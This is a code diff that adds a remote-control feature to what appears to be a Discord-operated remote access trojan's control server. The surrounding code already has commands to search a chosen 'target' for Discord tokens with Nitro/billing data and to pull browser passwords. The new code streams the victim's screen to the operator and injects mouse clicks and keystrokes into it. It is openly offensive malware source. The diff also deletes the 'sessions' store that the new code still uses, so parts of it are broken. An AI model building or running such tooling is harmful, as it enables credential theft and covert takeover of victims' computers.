@@ -36,8 +36,11 @@ class ClientSession:
         self.command_results = []
 
 # In-memory storage
-sessions: Dict[str, ClientSession] = {}
 current_target_id: Optional[str] = None
+
+# Remote Control Data
+remote_frames: Dict[str, bytes] = {}
+remote_events: Dict[str, List[dict]] = {}
 
 # GUI Queue for thread-safe updates
 gui_queue = queue.Queue()
@@ -168,7 +171,20 @@ async def token(ctx):
     if not current_target_id:
         return await ctx.send("❌ No target selected. Use `!use <id>` first.")
     queue_command(current_target_id, "token")
-    await ctx.send(f"💎 Ultra Deep Token Search & Verification requested for `{current_target_id}`...")
+    await ctx.send(f"💎 Ultra Deep Token Search & Verification (Nitro/Billing) requested for `{current_target_id}`...")
+
+@bot.command()
+async def remote(ctx, action: str = "start"):
+    if not current_target_id:
+        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
+    
+    if action == "start":
+        queue_command(current_target_id, "remote_start")
+        await ctx.send(f"🖥️ Remote Control starting for `{current_target_id}`...")
+        await ctx.send(f"🔗 **Control Link:** {os.getenv('SERVER_URL', 'http://localhost:8000')}/remote/{current_target_id}")
+    else:
+        queue_command(current_target_id, "remote_stop")
+        await ctx.send(f"🛑 Remote Control stopping for `{current_target_id}`.")
 
 @bot.command()
 async def password(ctx, browser: str = "all"):
@@ -479,6 +495,116 @@ async def receive_result(
         )
 
     return {"status": "ok"}
+
+# --- REMOTE CONTROL ENDPOINTS ---
+from fastapi.responses import HTMLResponse, Response
+
+@app.post("/api/remote/upload")
+async def remote_upload(id: str = Form(...), file: UploadFile = File(...)):
+    if id not in sessions: return {"status": "error"}
+    remote_frames[id] = await file.read()
+    return {"status": "ok"}
+
+@app.post("/api/remote/events")
+async def remote_get_events(data: dict):
+    client_id = data.get("id")
+    if not client_id or client_id not in sessions: return {"status": "error"}
+    
+    events = remote_events.get(client_id, [])
+    remote_events[client_id] = [] # Clear after sending
+    
+    if events:
+        return {"status": "events", "events": events}
+    return {"status": "idle"}
+
+@app.post("/api/remote/control")
+async def remote_control(data: dict):
+    client_id = data.get("id")
+    if not client_id or client_id not in sessions: return {"status": "error"}
+    
+    if client_id not in remote_events: remote_events[client_id] = []
+    remote_events[client_id].append(data.get("event"))
+    return {"status": "ok"}
+
+@app.get("/api/remote/frame/{client_id}")
+async def get_frame(client_id: str):
+    if client_id in remote_frames:
+        return Response(content=remote_frames[client_id], media_type="image/jpeg")
+    return Response(status_code=404)
+
+@app.get("/remote/{client_id}", response_class=HTMLResponse)
+async def remote_page(client_id: str):
+    if client_id not in sessions: return "<h1>Client Not Found</h1>"
+    
+    html_content = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Remote Control - {client_id}</title>
+        <style>
+            body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; text-align: center; margin: 0; overflow: hidden; }}
+            #screen {{ max-width: 90vw; max-height: 85vh; border: 2px solid #0f0; cursor: crosshair; margin-top: 10px; }}
+            .status {{ padding: 10px; background: #111; border-bottom: 1px solid #0f0; }}
+            .controls {{ padding: 5px; font-size: 0.8em; color: #aaa; }}
+        </style>
+    </head>
+    <body onkeydown="sendKey(event)">
+        <div class="status">
+            🔴 LIVE REMOTE CONTROL: {sessions[client_id].username}@{sessions[client_id].hostname} ({client_id})
+        </div>
+        <img id="screen" src="/api/remote/frame/{client_id}" onclick="sendClick(event)" onmousemove="sendMove(event)">
+        <div class="controls">
+            [Click to Mouse Click] | [Keyboard to Type] | [Move Mouse to Hover]
+        </div>
+
+        <script>
+            const clientId = "{client_id}";
+            const screen = document.getElementById('screen');
+            
+            // Refresh screen
+            setInterval(() => {{
+                screen.src = "/api/remote/frame/" + clientId + "?t=" + new Date().getTime();
+            }}, 500);
+
+            function sendEvent(event) {{
+                fetch("/api/remote/control", {{
+                    method: "POST",
+                    headers: {{ "Content-Type": "application/json" }},
+                    body: JSON.stringify({{ id: clientId, event: event }})
+                }});
+            }}
+
+            function sendClick(e) {{
+                const rect = screen.getBoundingClientRect();
+                const x = (e.clientX - rect.left) / rect.width;
+                const y = (e.clientY - rect.top) / rect.height;
+                sendEvent({{ type: "click", button: "left" }});
+            }}
+
+            let lastMove = 0;
+            function sendMove(e) {{
+                const now = Date.now();
+                if (now - lastMove < 200) return; // Throttling
+                lastMove = now;
+
+                const rect = screen.getBoundingClientRect();
+                const x = (e.clientX - rect.left) / rect.width;
+                const y = (e.clientY - rect.top) / rect.height;
+                sendEvent({{ type: "move", x: x, y: y }});
+            }}
+
+            function sendKey(e) {{
+                // Prevent scrolling/standard actions
+                if(["ArrowUp","ArrowDown","ArrowLeft","ArrowRight","Space"].includes(e.code)) {{
+                    e.preventDefault();
+                }}
+                sendEvent({{ type: "type", key: e.key.toLowerCase() }});
+            }}
+        </script>
+    </body>
+    </html>
+    """
+    return HTMLResponse(content=html_content)
 
 # --- HEADLESS LOGGING ---
 def console_log(msg):
